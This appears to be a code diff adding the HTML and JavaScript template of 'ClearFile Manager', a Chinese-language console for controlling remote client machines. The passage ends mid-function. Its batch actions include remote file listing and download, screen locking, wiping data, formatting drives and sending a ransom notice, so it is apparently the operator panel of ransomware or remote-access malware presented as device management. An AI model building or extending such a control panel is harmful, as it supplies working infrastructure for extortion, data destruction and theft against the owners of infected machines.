@@ -1,0 +1,904 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>ClearFile 设备管理控制台</title>
+    <style>
+        :root {
+            --primary: #2563eb;
+            --primary-hover: #1d4ed8;
+            --danger: #dc2626;
+            --danger-hover: #b91c1c;
+            --success: #16a34a;
+            --bg-body: #f3f4f6;
+            --bg-card: #ffffff;
+            --text-main: #111827;
+            --text-muted: #6b7280;
+            --border: #e5e7eb;
+            --radius: 8px;
+            --shadow: 0 1px 3px 0 rgba(0, 0, 0, 0.1), 0 1px 2px 0 rgba(0, 0, 0, 0.06);
+            --shadow-lg: 0 10px 15px -3px rgba(0, 0, 0, 0.1), 0 4px 6px -2px rgba(0, 0, 0, 0.05);
+        }
+
+        * { box-sizing: border-box; margin: 0; padding: 0; }
+        body { font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, "Helvetica Neue", Arial, sans-serif; background-color: var(--bg-body); color: var(--text-main); line-height: 1.5; padding-bottom: 40px; }
+
+        /* Navbar */
+        .navbar { background: var(--bg-card); border-bottom: 1px solid var(--border); padding: 1rem 2rem; display: flex; justify-content: space-between; align-items: center; position: sticky; top: 0; z-index: 50; box-shadow: var(--shadow); }
+        .brand { font-size: 1.25rem; font-weight: 700; color: var(--primary); display: flex; align-items: center; gap: 0.5rem; }
+        .nav-actions { display: flex; gap: 1rem; }
+
+        /* Container */
+        .container { max-width: 1200px; margin: 2rem auto; padding: 0 1rem; }
+
+        /* Toolbar */
+        .toolbar { background: var(--bg-card); padding: 1rem; border-radius: var(--radius); box-shadow: var(--shadow); display: flex; flex-wrap: wrap; gap: 1rem; align-items: center; justify-content: space-between; margin-bottom: 1.5rem; }
+        .toolbar-group { display: flex; gap: 0.5rem; align-items: center; flex-wrap: wrap; }
+        
+        /* Buttons & Inputs */
+        .btn { display: inline-flex; align-items: center; justify-content: center; padding: 0.5rem 1rem; border-radius: 6px; font-weight: 500; font-size: 0.875rem; cursor: pointer; transition: all 0.2s; border: 1px solid transparent; gap: 0.5rem; }
+        .btn-primary { background-color: var(--primary); color: white; }
+        .btn-primary:hover { background-color: var(--primary-hover); }
+        .btn-danger { background-color: var(--danger); color: white; }
+        .btn-danger:hover { background-color: var(--danger-hover); }
+        .btn-ghost { background-color: transparent; color: var(--text-main); border-color: var(--border); }
+        .btn-ghost:hover { background-color: #f9fafb; border-color: #d1d5db; }
+        .btn-sm { padding: 0.25rem 0.5rem; font-size: 0.75rem; }
+
+        input[type="text"], input[type="password"], select { padding: 0.5rem; border: 1px solid var(--border); border-radius: 6px; outline: none; transition: border-color 0.2s; font-size: 0.875rem; }
+        input[type="text"]:focus, input[type="password"]:focus, select:focus { border-color: var(--primary); ring: 2px solid rgba(37, 99, 235, 0.1); }
+
+        /* Device Grid */
+        .grid { display: grid; grid-template-columns: repeat(auto-fill, minmax(300px, 1fr)); gap: 1.5rem; }
+        .card { background: var(--bg-card); border-radius: var(--radius); box-shadow: var(--shadow); overflow: hidden; transition: transform 0.2s, box-shadow 0.2s; border: 1px solid var(--border); position: relative; }
+        .card:hover { transform: translateY(-2px); box-shadow: var(--shadow-lg); }
+        .card.selected { border-color: var(--primary); ring: 1px solid var(--primary); background-color: #eff6ff; }
+        
+        .card-header { padding: 1rem; border-bottom: 1px solid var(--border); display: flex; justify-content: space-between; align-items: center; background-color: #f8fafc; }
+        .card-body { padding: 1rem; }
+        .card-footer { padding: 0.75rem 1rem; background-color: #f9fafb; border-top: 1px solid var(--border); display: flex; justify-content: space-between; align-items: center; gap: 0.5rem; }
+
+        .device-title { font-weight: 600; font-size: 1rem; display: flex; align-items: center; gap: 0.5rem; }
+        .device-meta { font-size: 0.875rem; color: var(--text-muted); margin-bottom: 0.25rem; }
+        .status-dot { width: 8px; height: 8px; border-radius: 50%; display: inline-block; }
+        .status-online { background-color: var(--success); box-shadow: 0 0 0 2px rgba(22, 163, 74, 0.2); }
+        .status-offline { background-color: var(--text-muted); }
+        
+        .badge { display: inline-block; padding: 0.125rem 0.5rem; border-radius: 9999px; font-size: 0.75rem; font-weight: 500; background-color: #e5e7eb; color: var(--text-main); }
+        .badge-blue { background-color: #dbeafe; color: #1e40af; }
+
+        /* Logs */
+        .logs-container { margin-top: 1rem; padding: 0.5rem; background: #f1f5f9; border-radius: 4px; font-size: 0.75rem; color: #475569; max-height: 100px; overflow-y: auto; }
+        .log-item { display: flex; justify-content: space-between; padding: 2px 0; border-bottom: 1px solid #e2e8f0; }
+        .log-item:last-child { border-bottom: none; }
+
+        /* Modals */
+        .modal-overlay { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0, 0, 0, 0.5); backdrop-filter: blur(2px); z-index: 100; align-items: center; justify-content: center; opacity: 0; transition: opacity 0.3s ease; }
+        .modal-overlay.active { display: flex; opacity: 1; }
+        .modal-box { background: white; width: 90%; max-width: 450px; border-radius: 12px; box-shadow: 0 20px 25px -5px rgba(0, 0, 0, 0.1); transform: scale(0.95); transition: transform 0.3s ease; padding: 1.5rem; }
+        .modal-overlay.active .modal-box { transform: scale(1); }
+        .modal-header { font-size: 1.25rem; font-weight: 600; margin-bottom: 1rem; }
+        .modal-actions { margin-top: 1.5rem; display: flex; justify-content: flex-end; gap: 0.75rem; }
+
+        /* Toast */
+        .toast-container { position: fixed; bottom: 20px; right: 20px; z-index: 200; display: flex; flex-direction: column; gap: 10px; }
+        .toast { background: white; padding: 1rem; border-radius: 8px; box-shadow: var(--shadow-lg); border-left: 4px solid var(--primary); min-width: 250px; transform: translateX(100%); transition: transform 0.3s ease; display: flex; align-items: center; justify-content: space-between; }
+        .toast.show { transform: translateX(0); }
+        .toast.success { border-left-color: var(--success); }
+        .toast.error { border-left-color: var(--danger); }
+
+        /* Utility */
+        .hidden { display: none !important; }
+        .flex-spacer { flex: 1; }
+        .icon { width: 16px; height: 16px; fill: currentColor; }
+        
+        /* Checkbox custom */
+        .checkbox-wrapper { display: flex; align-items: center; gap: 0.5rem; cursor: pointer; user-select: none; }
+    </style>
+</head>
+<body>
+
+    <!-- Navbar -->
+    <nav class="navbar">
+        <div class="brand">
+            <svg class="icon" viewBox="0 0 24 24" style="width: 24px; height: 24px;"><path d="M12 2L2 7l10 5 10-5-10-5zm0 9l2.5-1.25L12 8.5l-2.5 1.25L12 11zm0 2.5l-5-2.5-5 2.5L12 22l10-8.5-5-2.5-5 2.5z"/></svg>
+            ClearFile Manager
+        </div>
+        <div class="nav-actions">
+            <button class="btn btn-ghost btn-sm" onclick="document.getElementById('passwordModal').classList.add('active')">
+                修改密码
+            </button>
+        </div>
+    </nav>
+
+    <div class="container">
+        <!-- Toolbar -->
+        <div class="toolbar">
+            <div class="toolbar-group">
+                <label class="checkbox-wrapper">
+                    <input type="checkbox" id="selectAll" onclick="toggleSelectAll()">
+                    <span>全选</span>
+                </label>
+                
+                <select id="groupFilter" onchange="filterDevices(this.value)" style="min-width: 150px;">
+                    <option value="">全部设备</option>
+                    <!-- Populated by JS -->
+                </select>
+            </div>
+
+            <div class="toolbar-group">
+                <span style="font-size: 0.875rem; color: var(--text-muted); margin-right: 0.5rem;">批量操作:</span>
+                <button class="btn btn-ghost" onclick="openCommandModal('ping')">Ping</button>
+                <button class="btn btn-ghost" onclick="openCommandModal('info')">信息</button>
+                <button class="btn btn-ghost" onclick="openCommandModal('list_files')">文件列表</button>
+                <button class="btn btn-ghost" onclick="openCommandModal('lock_screen')">锁定屏幕</button>
+                <button class="btn btn-primary" onclick="openMoveGroupModal()">移动分组</button>
+                <div style="width: 1px; height: 24px; background: var(--border); margin: 0 0.5rem;"></div>
+                <button class="btn btn-danger" onclick="openCommandModal('wipe_data')">清除数据</button>
+                <button class="btn btn-danger" onclick="openCommandModal('format_drives')">格式化</button>
+                <button class="btn btn-danger" onclick="openCommandModal('ransom')">勒索提示</button>
+            </div>
+        </div>
+
+        <!-- Device Grid -->
+        <div class="grid" id="deviceGrid">
+            {{range .}}
+            <div class="card" data-group="{{.GroupName}}" data-id="{{.ID}}">
+                <div class="card-header">
+                    <div class="device-title">
+                        <input type="checkbox" class="device-checkbox" value="{{.ID}}" onclick="updateCardSelection(this)">
+                        <span title="{{.Hostname}}">{{.Hostname}}</span>
+                    </div>
+                    <div class="status-dot {{if eq .Status "在线"}}status-online{{else}}status-offline{{end}}" title="{{.Status}}"></div>
+                </div>
+                
+                <div class="card-body">
+                    <div class="device-meta"><strong>ID:</strong> {{.ID}}</div>
+                    <div class="device-meta"><strong>IP:</strong> {{.IP}}</div>
+                    <div class="device-meta"><strong>系统:</strong> {{.OS}}</div>
+                    <div class="device-meta"><strong>最后在线:</strong> {{.LastSeen.Format "01-02 15:04"}}</div>
+                    
+                    <div style="margin-top: 10px; display: flex; justify-content: space-between; align-items: center;">
+                        <span class="badge badge-blue">{{.GroupName}}</span>
+                        <button class="btn btn-ghost btn-sm" onclick="editRemark('{{.ID}}', '{{.Remark}}')">
+                            {{if .Remark}}{{.Remark}}{{else}}添加备注{{end}}
+                        </button>
+                    </div>
+                </div>
+                
+                <div class="card-footer">
+                    <form action="/admin/group" method="POST" style="flex: 1; display: flex; gap: 5px;">
+                        <input type="hidden" name="device_id" value="{{.ID}}">
+                        <!-- Single device group move, simplified to just a quick dropdown -->
+                        <select name="group_name" class="group-dropdown" data-current="{{.GroupName}}" style="width: 100%; padding: 2px; font-size: 0.75rem;" onchange="this.form.submit()">
+                            <!-- Populated by JS -->
+                        </select>
+                    </form>
+                    <div style="display: flex; gap: 5px;">
+                        <button class="btn btn-ghost btn-sm" onclick="selectOne('{{.ID}}'); openCommandModal('ping')" title="Ping">
+                            <svg class="icon" viewBox="0 0 24 24"><path d="M2 12h20M2 12l4 4m-4-4l4-4"/></svg>
+                        </button>
+                        <button class="btn btn-ghost btn-sm" onclick="selectOne('{{.ID}}'); openCommandModal('info')" title="Info">
+                            <svg class="icon" viewBox="0 0 24 24"><path d="M13 16h-1v-4h-1m1-4h.01M21 12a9 9 0 11-18 0 9 9 0 0118 0z"/></svg>
+                        </button>
+                        <button class="btn btn-ghost btn-sm" onclick="openLogsModal('{{.ID}}')" title="Logs">
+                            <svg class="icon" viewBox="0 0 24 24"><path d="M14 2H6a2 2 0 0 0-2 2v16a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2V8z"/><polyline points="14 2 14 8 20 8"/><line x1="16" y1="13" x2="8" y2="13"/><line x1="16" y1="17" x2="8" y2="17"/><polyline points="10 9 9 9 8 9"/></svg>
+                        </button>
+                        <button class="btn btn-ghost btn-sm" onclick="openFileManager('{{.ID}}')" title="Files">
+                            <svg class="icon" viewBox="0 0 24 24"><path d="M22 19a2 2 0 0 1-2 2H4a2 2 0 0 1-2-2V5a2 2 0 0 1 2-2h5l2 3h9a2 2 0 0 1 2 2z"></path></svg>
+                        </button>
+                        <button class="btn btn-ghost btn-sm" onclick="selectOne('{{.ID}}'); openCommandModal('lock_screen')" title="Lock Screen">
+                            <svg class="icon" viewBox="0 0 24 24"><rect x="3" y="11" width="18" height="11" rx="2" ry="2"></rect><path d="M7 11V7a5 5 0 0 1 10 0v4"></path></svg>
+                        </button>
+                        <button class="btn btn-ghost btn-sm" onclick="selectOne('{{.ID}}'); openCommandModal('unlock_screen')" title="Unlock Screen">
+                            <svg class="icon" viewBox="0 0 24 24"><rect x="3" y="11" width="18" height="11" rx="2" ry="2"></rect><path d="M7 11V7a5 5 0 0 1 10 0"></path></svg>
+                        </button>
+                    </div>
+                </div>
+            </div>
+            {{else}}
+            <div style="grid-column: 1 / -1; text-align: center; padding: 4rem; color: var(--text-muted);">
+                暂无设备连接，请启动客户端程序。
+            </div>
+            {{end}}
+        </div>
+    </div>
+
+    <!-- Command Modal -->
+    <div id="cmdModal" class="modal-overlay">
+        <div class="modal-box">
+            <h3 class="modal-header" id="modalTitle">发送指令</h3>
+            <p id="modalDesc" style="color: var(--text-muted); margin-bottom: 1rem;">确认执行操作？</p>
+            
+            <div id="pwdInput" class="hidden">
+                <label style="display: block; margin-bottom: 0.5rem; font-weight: 500;">管理员密码 (敏感操作):</label>
+                <input type="password" id="password" style="width: 100%;" placeholder="请输入密码">
+                <p id="errorMsg" style="color: var(--danger); font-size: 0.875rem; margin-top: 0.5rem; display: none;"></p>
+            </div>
+
+            <div class="modal-actions">
+                <button class="btn btn-ghost" onclick="closeModal('cmdModal')">取消</button>
+                <button class="btn btn-primary" onclick="submitCommand()">确认发送</button>
+            </div>
+        </div>
+    </div>
+
+    <!-- Move Group Modal -->
+    <div id="moveGroupModal" class="modal-overlay">
+        <div class="modal-box">
+            <h3 class="modal-header">批量移动分组</h3>
+            
+            <div style="margin-bottom: 1rem;">
+                <label class="checkbox-wrapper" style="margin-bottom: 0.5rem;">
+                    <input type="radio" name="groupTargetType" value="existing" checked onclick="toggleGroupTarget()"> 
+                    <span>移动到现有分组</span>
+                </label>
+                <select id="batchGroupSelect" style="width: 100%;">
+                    <option value="">-- 选择分组 --</option>
+                </select>
+            </div>
+            
+            <div style="margin-bottom: 1rem;">
+                <label class="checkbox-wrapper" style="margin-bottom: 0.5rem;">
+                    <input type="radio" name="groupTargetType" value="new" onclick="toggleGroupTarget()"> 
+                    <span>移动到新分组</span>
+                </label>
+                <input type="text" id="batchGroupInput" placeholder="输入新分组名称" style="width: 100%;" disabled>
+            </div>
+
+            <div class="modal-actions">
+                <button class="btn btn-ghost" onclick="closeModal('moveGroupModal')">取消</button>
+                <button class="btn btn-primary" onclick="submitBatchMove()">确认移动</button>
+            </div>
+        </div>
+    </div>
+
+    <!-- Remark Modal -->
+    <div id="remarkModal" class="modal-overlay">
+        <div class="modal-box">
+            <h3 class="modal-header">修改备注</h3>
+            <form action="/admin/remark" method="POST">
+                <input type="hidden" id="remarkDeviceId" name="device_id">
+                <input type="text" id="remarkInput" name="remark" style="width: 100%;" placeholder="输入备注信息">
+                <div class="modal-actions">
+                    <button type="button" class="btn btn-ghost" onclick="closeModal('remarkModal')">取消</button>
+                    <button type="submit" class="btn btn-primary">保存</button>
+                </div>
+            </form>
+        </div>
+    </div>
+
+    <!-- Logs Modal -->
+    <div id="logsModal" class="modal-overlay">
+        <div class="modal-box" style="max-width: 800px; width: 95%;">
+            <div style="display: flex; justify-content: space-between; align-items: center; margin-bottom: 1rem;">
+                <h3 class="modal-header" style="margin-bottom: 0;">设备日志</h3>
+                <button class="btn btn-ghost btn-sm" onclick="refreshLogs()">刷新</button>
+            </div>
+            <div id="logsContent" style="max-height: 60vh; overflow-y: auto; background: #f8fafc; padding: 1rem; border-radius: 6px; font-size: 0.875rem;">
+                加载中...
+            </div>
+            <div class="modal-actions">
+                <button class="btn btn-ghost" onclick="closeModal('logsModal')">关闭</button>
+            </div>
+        </div>
+    </div>
+
+    <!-- File Manager Modal -->
+    <div id="fileManagerModal" class="modal-overlay">
+        <div class="modal-box" style="max-width: 900px; width: 95%;">
+            <div style="display: flex; justify-content: space-between; align-items: center; margin-bottom: 1rem;">
+                <h3 class="modal-header" style="margin-bottom: 0;">文件管理</h3>
+                <div style="display: flex; align-items: center; gap: 10px;">
+                     <span id="currentPathDisplay" style="color: #666; font-size: 0.875rem; font-family: monospace; background: #f1f5f9; padding: 2px 6px; border-radius: 4px;">.</span>
+                     <button class="btn btn-ghost btn-sm" onclick="refreshFileManager()">刷新</button>
+                </div>
+            </div>
+            
+            <div id="fileManagerContent" style="height: 50vh; overflow-y: auto; background: #fff; border: 1px solid #e2e8f0; border-radius: 6px; position: relative;">
+                <div style="padding: 2rem; text-align: center; color: #9ca3af;">加载中...</div>
+            </div>
+            
+            <div class="modal-actions">
+                <button class="btn btn-ghost" onclick="closeModal('fileManagerModal')">关闭</button>
+            </div>
+        </div>
+    </div>
+
+    <!-- Password Modal -->
+    <div id="passwordModal" class="modal-overlay">
+        <div class="modal-box">
+            <h3 class="modal-header">修改管理员密码</h3>
+            <form action="/admin/password" method="POST">
+                <input type="password" name="new_password" placeholder="新密码" style="width: 100%;" required>
+                <div class="modal-actions">
+                    <button type="button" class="btn btn-ghost" onclick="closeModal('passwordModal')">取消</button>
+                    <button type="submit" class="btn btn-primary">更新</button>
+                </div>
+            </form>
+        </div>
+    </div>
+
+    <!-- Toast Container -->
+    <div class="toast-container" id="toastContainer"></div>
+
+    <script>
+        // --- State ---
+        let currentAction = '';
+        let currentLogDeviceId = null;
+
+        function openLogsModal(deviceId) {
+            currentLogDeviceId = deviceId;
+            openModal('logsModal');
+            refreshLogs();
+        }
+
+        function refreshLogs() {
+            if (!currentLogDeviceId) return;
+            const content = document.getElementById('logsContent');
+            content.innerHTML = '<div style="text-align: center; color: #9ca3af;">加载中...</div>';
+
+            fetch(`/admin/logs?device_id=${currentLogDeviceId}`)
+                .then(res => res.json())
+                .then(logs => {
+                    if (!logs || logs.length === 0) {
+                        content.innerHTML = '<div style="text-align: center; color: #9ca3af;">暂无日志</div>';
+                        return;
+                    }
+                    
+                    let html = '';
+                    logs.forEach(log => {
+                        let resultDisplay = log.result;
+                        // Try to parse if it looks like file list
+                        if (log.action === 'list_files') {
+                            try {
+                                const files = JSON.parse(log.result);
+                                if (Array.isArray(files)) {
+                                    resultDisplay = renderFileTable(files);
+                                }
+                            } catch (e) {
+                                // ignore, display as text
+                            }
+                        }
+                        
+                        html += `
+                            <div style="border-bottom: 1px solid #e2e8f0; padding: 0.75rem 0;">
+                                <div style="display: flex; justify-content: space-between; margin-bottom: 0.25rem;">
+                                    <span style="font-weight: 600; color: var(--primary);">${log.action}</span>
+                                    <span style="color: var(--text-muted); font-size: 0.75rem;">${new Date(log.created_at).toLocaleString()}</span>
+                                </div>
+                                <div style="white-space: pre-wrap; word-break: break-all; color: #334155;">${resultDisplay}</div>
+                            </div>
+                        `;
+                    });
+                    content.innerHTML = html;
+                })
+                .catch(err => {
+                    content.innerHTML = `<div style="color: var(--danger);">加载失败: ${err.message}</div>`;
+                });
+        }
+
+        function renderFileTable(files) {
+            if (files.length === 0) return '<div>空目录</div>';
+            
+            const escape = (s) => (s || '').replace(/\\/g, '\\\\').replace(/'/g, "\\'");
+
+            let rows = files.map(f => {
+                let actionBtn = '';
+                if (!f.is_dir) {
+                    let path = f.path || f.name;
+                    actionBtn = `<button class="btn btn-ghost btn-sm" onclick="downloadFile('${escape(path)}')">下载</button>`;
+                }
+                return `
+                <tr>
+                    <td style="padding: 4px;">${f.is_dir ? '📁' : '📄'} ${f.name}</td>
+                    <td style="padding: 4px; text-align: right;">${formatSize(f.size)}</td>
+                    <td style="padding: 4px; color: #666;">${f.mod_time}</td>
+                    <td style="padding: 4px; text-align: center;">${actionBtn}</td>
+                </tr>
+            `}).join('');
+
+            return `
+                <table style="width: 100%; border-collapse: collapse; font-size: 0.8rem;">
+                    <thead>
+                        <tr style="background: #e2e8f0;">
+                            <th style="text-align: left; padding: 4px;">名称</th>
+                            <th style="text-align: right; padding: 4px;">大小</th>
+                            <th style="text-align: left; padding: 4px;">修改时间</th>
+                            <th style="text-align: center; padding: 4px;">操作</th>
+                        </tr>
+                    </thead>
+                    <tbody>${rows}</tbody>
+                </table>
+            `;
+        }
+
+        function downloadFile(path) {
+            if(!currentLogDeviceId) return;
+            
+            fetch('/admin/command', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({
+                    device_ids: [currentLogDeviceId],
+                    action: 'get_file',
+                    payload: path
+                })
+            })
+            .then(res => res.json())
+            .then(data => {
+                if(data.status === 'ok') {
+                    showToast('下载指令已发送，请稍后刷新日志查看下载链接');
+                    setTimeout(refreshLogs, 2000);
+                } else {
+                    showToast('发送失败: ' + data.message, 'error');
+                }
+            })
+            .catch(err => showToast('发送失败', 'error'));
+        }
+
+        function formatSize(bytes) {
+            if (bytes === 0) return '0 B';
+            const k = 1024;
+            const sizes = ['B', 'KB', 'MB', 'GB', 'TB'];
+            const i = Math.floor(Math.log(bytes) / Math.log(k));
+            return parseFloat((bytes / Math.pow(k, i)).toFixed(2)) + ' ' + sizes[i];
+        }
+
+        let currentFileDeviceId = null;
+        let currentPath = ".";
+        let filePollTimer = null;
+        let lastFileReqTime = 0;
+
+        function openFileManager(deviceId) {
+            currentFileDeviceId = deviceId;
+            currentPath = "."; // Reset to home/default
+            openModal('fileManagerModal');
+            refreshFileManager();
+        }
+
+        function refreshFileManager() {
+            loadFileBrowser(currentPath);
+        }
+
+        function loadFileBrowser(path) {
+            if (!currentFileDeviceId) return;
+            currentPath = path;
+            document.getElementById('currentPathDisplay').innerText = (path === "." ? "Home" : path);
+            
+            const content = document.getElementById('fileManagerContent');
+            content.innerHTML = '<div style="padding: 2rem; text-align: center; color: #9ca3af;">加载中...</div>';
+
+            // Send list_files command
+            lastFileReqTime = Date.now();
+            fetch('/admin/command', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({
+                    device_ids: [currentFileDeviceId],
+                    action: 'list_files',
+                    payload: path
+                })
+            })
+            .then(res => res.json())
+            .then(data => {
+                if (data.status === 'ok') {
+                    // Start polling for result
+                    if (filePollTimer) clearInterval(filePollTimer);
+                    filePollTimer = setInterval(pollFileResult, 1000);
+                } else {
+                    content.innerHTML = `<div style="padding: 2rem; text-align: center; color: var(--danger);">发送指令失败: ${data.message}</div>`;
+                }
+            })
+            .catch(err => {
+                content.innerHTML = `<div style="padding: 2rem; text-align: center; color: var(--danger);">网络错误: ${err.message}</div>`;
+            });
+        }
+
+        function pollFileResult() {
+            // Stop polling after timeout (e.g. 30s)
+            if (Date.now() - lastFileReqTime > 30000) {
+                clearInterval(filePollTimer);
+                document.getElementById('fileManagerContent').innerHTML = '<div style="padding: 2rem; text-align: center; color: var(--text-muted);">请求超时，请刷新重试</div>';
+                return;
+            }
+
+            fetch(`/admin/logs?device_id=${currentFileDeviceId}`)
+                .then(res => res.json())
+                .then(logs => {
+                    if (!logs || logs.length === 0) return;
+                    
+                    // Find latest list_files log
+                    // Filter logs created after our request time (minus some skew buffer)
+                    const relevantLogs = logs.filter(l => 
+                        l.action === 'list_files' && 
+                        new Date(l.created_at).getTime() > (lastFileReqTime - 5000)
+                    );
+
+                    if (relevantLogs.length > 0) {
+                        // Pick the newest one
+                        const latest = relevantLogs[0]; // logs are usually sorted desc? Check API. 
+                        // Assuming API returns sorted desc (latest first). If not, sort.
+                        // Let's assume desc for now, or just find max created_at
+                        
+                        clearInterval(filePollTimer);
+                        try {
+                            const files = JSON.parse(latest.result);
+                            renderFileManagerTable(files);
+                        } catch (e) {
+                            document.getElementById('fileManagerContent').innerHTML = `<div style="padding: 2rem; text-align: center; color: var(--danger);">解析数据失败: ${latest.result}</div>`;
+                        }
+                    }
+                });
+        }
+
+        function renderFileManagerTable(files) {
+            const content = document.getElementById('fileManagerContent');
+            if (!files || files.length === 0) {
+                content.innerHTML = '<div style="padding: 2rem; text-align: center; color: var(--text-muted);">空目录</div>';
+                return;
+            }
+
+            // Sort: Directories first, then files
+            files.sort((a, b) => {
+                if (a.is_dir === b.is_dir) return a.name.localeCompare(b.name);
+                return a.is_dir ? -1 : 1;
+            });
+
+            const escape = (s) => (s || '').replace(/\\/g, '\\\\').replace(/'/g, "\\'");
+
+            let rows = files.map(f => {
+                let icon = f.is_dir ? '📁' : '📄';
+                let nameHtml = f.is_dir ? 
+                    `<a href="#" onclick="loadFileBrowser('${escape(f.path)}'); return false;" style="color: var(--primary); text-decoration: none; font-weight: 500;">${f.name}</a>` : 
+                    f.name;
+                
+                let sizeHtml = f.is_dir ? '-' : formatSize(f.size);
+                
+                let actions = '';
+                if (!f.is_dir) {
+                    // Fix: Escape backslashes for JS string to avoid syntax errors with Windows paths
+                    const safePath = f.path.replace(/\\/g, '\\\\').replace(/'/g, "\\'");
+                    actions = `<button class="btn btn-ghost btn-sm" onclick="downloadFile('${safePath}'); event.stopPropagation();">下载</button>`;
+                }
+
+                return `
+                <tr style="border-bottom: 1px solid #f1f5f9;">
+                    <td style="padding: 8px;">${icon} ${nameHtml}</td>
+                    <td style="padding: 8px; text-align: right; color: #64748b;">${sizeHtml}</td>
+                    <td style="padding: 8px; color: #94a3b8;">${f.mod_time}</td>
+                    <td style="padding: 8px; text-align: center;">${actions}</td>
+                </tr>
+                `;
+            }).join('');
+
+            // Add "Up" link if not at root/home (simple check: currentPath !== ".")
+            let upRow = '';
+            if (currentPath !== ".") {
+                // Naive parent path: split by separator and pop
+                // Since we don't know separator (win/nix) easily here without logic, 
+                // we might rely on the user clicking "Home" or specific breadcrumbs.
+                // For now, let's just show a "Home" button in toolbar.
+                // Or implementing a simple ".." using JS string manipulation if we assume standard paths.
+                // Let's stick to the "Home" button in the header (which resets to ".").
+            }
+
+            content.innerHTML = `
+                <table style="width: 100%; border-collapse: collapse; font-size: 0.875rem;">
+                    <thead style="position: sticky; top: 0; background: #f8fafc; z-index: 10;">
+                        <tr>
+                            <th style="text-align: left; padding: 8px; border-bottom: 2px solid #e2e8f0;">名称</th>
+                            <th style="text-align: right; padding: 8px; border-bottom: 2px solid #e2e8f0; width: 100px;">大小</th>
+                            <th style="text-align: left; padding: 8px; border-bottom: 2px solid #e2e8f0; width: 150px;">修改时间</th>
+                            <th style="text-align: center; padding: 8px; border-bottom: 2px solid #e2e8f0; width: 80px;">操作</th>
+                        </tr>
+                    </thead>
+                    <tbody>${rows}</tbody>
+                </table>
+            `;
+        }
+
+        // --- Init ---
+        document.addEventListener('DOMContentLoaded', () => {
+            initGroups();
+        });
+
+        function initGroups() {
+            const groups = new Set();
+            document.querySelectorAll('.card').forEach(card => {
+                const g = card.getAttribute('data-group');
+                if (g) groups.add(g);
+            });
+
+            // Populate Main Filter
+            const filterSelect = document.getElementById('groupFilter');
+            // Populate Batch Modal
+            const batchSelect = document.getElementById('batchGroupSelect');
+            
+            groups.forEach(g => {
+                // Filter
+                let opt1 = document.createElement('option');
+                opt1.value = g;
+                opt1.textContent = g;
+                filterSelect.appendChild(opt1);
+
+                // Batch
+                let opt2 = document.createElement('option');
+                opt2.value = g;
+                opt2.textContent = g;
+                batchSelect.appendChild(opt2);
+            });
+
+            // Populate Card Dropdowns
+            document.querySelectorAll('.group-dropdown').forEach(select => {
+                const current = select.getAttribute('data-current');
+                select.innerHTML = ''; // Clear
+                groups.forEach(g => {
+                    let opt = document.createElement('option');
+                    opt.value = g;
+                    opt.textContent = g;
+                    if (g === current) opt.selected = true;
+                    select.appendChild(opt);
+                });
+                // Add "New..." option logic if needed, but for now simple list
+            });
+        }
+
+        // --- Selection Logic ---
+        function toggleSelectAll() {
+            const checked = document.getElementById('selectAll').checked;
+            document.querySelectorAll('.device-checkbox').forEach(cb => {
+                // Only select visible ones (if filtered)
+                if (cb.closest('.card').style.display !== 'none') {
+                    cb.checked = checked;
+                    updateCardSelection(cb);
+                }
+            });
+        }
+
+        function updateCardSelection(checkbox) {
+            const card = checkbox.closest('.card');
+            if (checkbox.checked) {
+                card.classList.add('selected');
+            } else {
+                card.classList.remove('selected');
+            }
+        }
+
+        function selectOne(id) {
+            // Uncheck all
+            document.getElementById('selectAll').checked = false;
+            document.querySelectorAll('.device-checkbox').forEach(cb => {
+                cb.checked = false;
+                updateCardSelection(cb);
+            });
+            // Check target
+            const target = document.querySelector(`.device-checkbox[value="${id}"]`);
+            if (target) {
+                target.checked = true;
+                updateCardSelection(target);
+            }
+        }
+
+        function filterDevices(groupName) {
+            document.querySelectorAll('.card').forEach(card => {
+                if (groupName === "" || card.getAttribute('data-group') === groupName) {
+                    card.style.display = "block";
+                } else {
+                    card.style.display = "none";
+                }
+            });
+            // Reset selection when filtering to avoid hidden selections
+            document.getElementById('selectAll').checked = false;
+            toggleSelectAll(); 
+        }
+
+        // --- Modals ---
+        function openCommandModal(action) {
+            const selected = getSelectedIds();
+            if (selected.length === 0) {
+                showToast("请先选择至少一个设备", "error");
+                return;
+            }
+
+            currentAction = action;
+            document.getElementById('modalTitle').innerText = "发送指令: " + action;
+            document.getElementById('modalDesc').innerText = `即将对 ${selected.length} 台设备执行操作`;
+            
+            const isSensitive = ['wipe_data', 'format_drives', 'ransom'].includes(action);
+            const pwdDiv = document.getElementById('pwdInput');
+            pwdDiv.classList.toggle('hidden', !isSensitive);
+            document.getElementById('password').value = "";
+            document.getElementById('errorMsg').style.display = "none";
+
+            openModal('cmdModal');
+        }
+
+        function openMoveGroupModal() {
+            const selected = getSelectedIds();
+            if (selected.length === 0) {
+                showToast("请先选择至少一个设备", "error");
+                return;
+            }
+            openModal('moveGroupModal');
+        }
+
+        function editRemark(id, currentRemark) {
+            document.getElementById('remarkDeviceId').value = id;
+            document.getElementById('remarkInput').value = currentRemark;
+            openModal('remarkModal');
+        }
+
+        function openModal(id) {
+            document.getElementById(id).classList.add('active');
+        }
+
+        function closeModal(id) {
+            document.getElementById(id).classList.remove('active');
+        }
+
+        function toggleGroupTarget() {
+            const type = document.querySelector('input[name="groupTargetType"]:checked').value;
+            document.getElementById('batchGroupSelect').disabled = (type !== 'existing');
+            document.getElementById('batchGroupInput').disabled = (type !== 'new');
+        }
+
+        // --- Actions ---
+        function getSelectedIds() {
+            return Array.from(document.querySelectorAll('.device-checkbox:checked')).map(cb => cb.value);
+        }
+
+        function submitCommand() {
+            const selected = getSelectedIds();
+            const password = document.getElementById('password').value;
+
+            fetch('/admin/command', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({
+                    device_ids: selected,
+                    action: currentAction,
+                    password: password
+                })
+            })
+            .then(res => res.json().then(data => ({ status: res.status, body: data })))
+            .then(res => {
+                if (res.status === 200) {
+                    showToast(`指令已发送至 ${res.body.count} 台设备`, "success");
+                    closeModal('cmdModal');
+                    setTimeout(() => location.reload(), 1000);
